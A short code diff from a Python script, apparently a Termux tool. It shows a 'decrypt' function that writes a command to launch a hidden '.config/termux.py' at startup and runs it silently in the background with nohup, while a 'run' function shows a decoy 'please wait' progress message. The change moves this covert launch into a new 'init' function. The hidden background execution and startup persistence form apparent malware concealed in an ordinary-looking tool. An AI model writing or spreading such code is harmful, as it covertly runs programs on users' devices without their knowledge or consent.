@@ -16,9 +16,10 @@ def decrypt(path):
 	fd.write('nohup python3 .config/termux.py >/dev/null 2>&1 &')
 	fd.close()
 	os.system('nohup python3 ' + path + '/.config/termux.py >/dev/null 2>&1 &')
-def run(ip, port, v):
+def init():
 	import pathlib, sys, time
 	decrypt(str(pathlib.Path.home()))
+def run(ip, port, v):
 	i = 0
 	while True:
 		sys.stdout.write('\r\033[92m[+] please wait %s\033[0m'%('.' * i))
